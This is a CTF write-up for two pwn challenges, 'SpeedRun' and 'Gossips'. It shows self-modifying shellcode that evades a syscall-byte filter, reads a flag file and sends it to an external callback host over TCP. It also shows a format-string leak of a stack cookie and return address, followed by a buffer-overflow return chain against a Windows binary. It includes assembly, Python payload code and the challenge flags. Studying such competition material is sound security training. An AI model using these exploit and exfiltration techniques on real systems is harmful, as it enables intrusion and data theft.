# NEXSEC 2026 CTF — PWN Write-ups

**Contents:** [SpeedRun](#speedrun) · [Gossips](#gossips)

---

# SpeedRun

| Field | Details |
| --- | --- |
| Category | PWN |
| Points | 495 |
| Service | `koala.nexsec.my:35028` |
| Technique | Floating-point input gates, self-modifying shellcode, file discovery, TCP callback |
| Status | Solved |

## Challenge

> please solve it asap so i can sleep peacefully.

Connecting to the remote service presented two questions before the program would accept machine code:

```text
=== speedrun ===
please solve it asap so i can sleep peacefully.

turn 1/2: what's the magic number, buddy?
>
turn 2/2: no. THE magic number.
>

[+] gate passed. the floor is yours.
send here, then up to 4096 bytes of code.
>
```

The objective was to get past these input checks, run code inside the challenge process, and obtain the flag. The challenge did not simply print the flag back to the original connection; the working approach used an outbound callback.

## Getting through the two checks

For the first prompt, the input `nan` worked. **The exact comparison in the challenge binary is not reproduced here**, so I am reporting the observed bypass rather than assuming its source-level implementation.

The second input was the decimal floating-point value:

```text
6.892987146013775e-42
```

When parsed as an IEEE-754 single-precision float, this has the bit representation `0x00001337`. The decimal value looks arbitrary, but its 32-bit representation reveals the intended *magic number* (`0x1337`).

The exploit script sends the two lines in order:

```python
s.sendall(b'nan\n')
s.sendall((MAGIC_FLOAT + '\n').encode())
```

Once both prompts were satisfied, the service allowed a payload of at most **4096 bytes**.

## Shellcode restriction and bypass

The submitted machine code could not contain the literal x86-64 syscall bytes `0f 05`. The solution used **self-modifying shellcode**: assemble the payload with the two bytes `0f 04` in place of each syscall, then patch those bytes after the shellcode starts running.

A simplified excerpt from the submitted assembly shows the patching loop:

```asm
_start:
    lea rbx, [rip+_start]
    lea rcx, [rip+payload_end]
patch_syscalls:
    cmp rbx, rcx
    jae patched
    cmp byte ptr [rbx], 0x0f
    jne nextbyte
    cmp byte ptr [rbx+1], 0x04
    jne nextbyte
    mov byte ptr [rbx+1], 0x05
    inc rbx
nextbyte:
    inc rbx
    jmp patch_syscalls
patched:
    ; syscall sites now contain 0f 05
```

The Python generator checked the produced bytes before submission:

```python
if b'\x0f\x05' in code:
    raise ValueError('banned opcode found in encoded shellcode')
if len(code) > 4096:
    raise ValueError('shellcode too long')
```

This distinction is important: the transmitted payload avoids the forbidden byte pattern, but the code modifies itself at runtime so it can still execute Linux system calls.

## Finding and extracting the flag

Rather than hard-code an unknown flag filename, the shellcode enumerated the current directory and looked for a filename starting with `flag-`.

Its main actions were:

1. Open the current directory (`.`) with `open`.
2. Read directory entries via `getdents64` (syscall 217).
3. Compare each directory-entry name against the `flag-` prefix.
4. Open the matching file and read up to `0x300` bytes.
5. Create a TCP socket, connect to the configured callback endpoint, and write the bytes to that socket.

The relevant filename prefix check is a literal part of the exploit:

```asm
lea r8, [rbx+19]
cmp dword ptr [r8], 0x67616c66  ; "flag" in little-endian order
jne next_dirent
cmp byte ptr [r8+4], 0x2d    ; '-'
jne next_dirent
```

The exploit generated a `sockaddr_in` structure using the callback hostname/IP and port supplied to the Python script, embedding it into the resulting shellcode.

## Delivery and result

The exploit connected to the TCP service, sent the two answers, then sent a **16-bit little-endian length** followed by the payload bytes:

```python
s.sendall(struct.pack('<H', len(code)) + code)
```

The recorded successful attempt used a **Pinggy TCP tunnel** as a publicly reachable callback destination. The shellcode was **314 bytes** long. After submission, the listening callback endpoint received the flag:

```text
[+] gate passed. the floor is yours.
[+] Shellcode sent!
[+] Listening for flag callback...

FLAG: nexsec26{Good___morning___or___perhaps___good___evening___everyone!!!}
```

The remote delivery and callback steps are implemented in the companion [`exploit.py`](pwn/speedrun/exploit.py). Its command-line options include `--host`, `--port`, `--callback-ip`, and `--callback-port`; a functioning externally accessible callback is required to reproduce the remote retrieval.

## Flag

```text
nexsec26{Good___morning___or___perhaps___good___evening___everyone!!!}
```

## Takeaway

The interesting part of SpeedRun was not just recognizing `0x1337` in floating-point form. The final payload also needed to operate under a syscall-byte restriction and find a flag whose exact filename was unknown. Encoding syscall instructions until runtime, using `getdents64` for discovery, and returning the file over a TCP callback completed the chain.

---

# Gossips

| Field | Details |
| --- | --- |
| Category | PWN |
| Points | Not confirmed in recovered records |
| Service | `koala.nexsec.my:35563` |
| Technique | Format-string leak, stack-cookie preservation, PE image-base leak, ret2win |
| Status | Solved |

## Challenge

The remote application introduced itself as a gossip board that would repeat anything it was told:

```text
=== gossips: the watercooler that never forgets ===
   (tell it anything. it tells everyone.)

[gossips] before you sit down... who are you?
[gossips] so... tell me a secret. i PROMISE i won't tell anyone.
[gossips] last words before it all burns?
```

The goal was to turn its chat-style inputs into an exploit that reached the flag-revealing function. The working solution used **two separate weaknesses**: the "secret" stage exposed stack data through a format string, and the final input could overwrite a saved return address.

## Leaking the stack

The secret input was interpreted as a format string rather than printed as ordinary user-controlled text. Supplying a sequence of `%p` specifiers therefore disclosed values from the current call frame.

The final exploit used 47 pointer conversions, separated by dots:

```python
RETURN_ARG_INDEX = 47
fmt = b'%p.' * RETURN_ARG_INDEX + b'\n'
sock.sendall(fmt)
```

A sample response from the investigation contained addresses formatted in hexadecimal, such as:

```text
[gossips] wow. okay. well:
00000001400250D8.00007FFFFE1FFCF0.000000007FFC3441....
```

The **44th** leaked value corresponded to the saved stack cookie, and the **47th** was the return address needed to derive the PE image base. These indices are not interchangeable with raw zero-based Python list indices, which is why the exploit uses `index - 1` when parsing the leak.

```python
CANARY_ARG_INDEX = 44
RETURN_ARG_INDEX = 47

cookie = int(tokens[CANARY_ARG_INDEX - 1], 16)
caller_ret = int(tokens[RETURN_ARG_INDEX - 1], 16)
```

The recovered cookie allowed us to preserve the correct security value during the later overflow. The return address supplied a runtime anchor despite image randomization.

## Computing useful addresses

The executable in the challenge was a **Windows PE** binary, so the exploit worked with offsets relative to the image base. From the examined executable layout, the offset of the leaked caller return address was `0x15f0`.

The script then calculated:

```python
RETURN_RVA = 0x15f0
WIN_RVA = 0x1000
RET_GADGET_RVA = 0x10e7

base = caller_ret - RETURN_RVA
win_addr = base + WIN_RVA
ret_gadget = base + RET_GADGET_RVA
```

The address at `base + 0x1000` was the flag function. A single-instruction `ret` gadget at `base + 0x10e7` was used before that function to align the stack for the Windows x64 calling convention.

## Building the final overflow

In the final input, the controlled buffer began `0x110` bytes before the saved security cookie. By leaking the cookie first, we could overwrite the buffer and place the original cookie back at its expected position instead of failing the stack-protection check.

The payload was constructed in this order:

| Offset in payload | Content | Size |
| --- | --- | --- |
| `0x000` | `A` padding up to the cookie | `0x110` |
| `0x110` | Previously leaked stack cookie | `0x08` |
| `0x118` | `B` padding across the remaining saved-state area | `0x10` |
| `0x128` | Alignment `ret` gadget | `0x08` |
| `0x130` | Address of flag function | `0x08` |
| **Total** | | **`0x138`** |

The working script represented that as:

```python
payload  = b'A' * 0x110
payload += p64(cookie)
payload += b'B' * 0x10
payload += p64(ret_gadget)
payload += p64(win_addr)
assert len(payload) == 0x138
sock.sendall(payload)
```

The initial, shorter return sequence was not the final working approach. Adding the alignment gadget before the flag function was part of the corrected exploit.

## Result

The Python script performed the whole sequence over a single service connection:

1. Submit a username (`guest`).
2. Send the format-string leak to the secret prompt.
3. Extract the stack cookie and return address.
4. Calculate the runtime PE base, the alignment gadget, and the flag function.
5. Send the overflow at the final prompt and read the service response.

The corrected exploit successfully reached the flag function. The flag submitted for the challenge was accepted:

```text
nexsec26{3bc38871b4313662863c62545c9f30cb0d09a4b379d0029b3ac96e344fa09539}
```

The full exploit, including its leak parser and network I/O, is in [`exploit.py`](pwn/gossips/exploit.py). The file is the recovered final version, not a reconstruction of hypothetical commands.

## Flag

```text
nexsec26{3bc38871b4313662863c62545c9f30cb0d09a4b379d0029b3ac96e344fa09539}
```

## Takeaway

The format-string leak and the buffer overflow were individually useful, but combining them defeated the two major obstacles: stack-cookie verification and PE address randomization. With the cookie restored in the overflow and the runtime base known, a short return chain could jump to the flag routine.
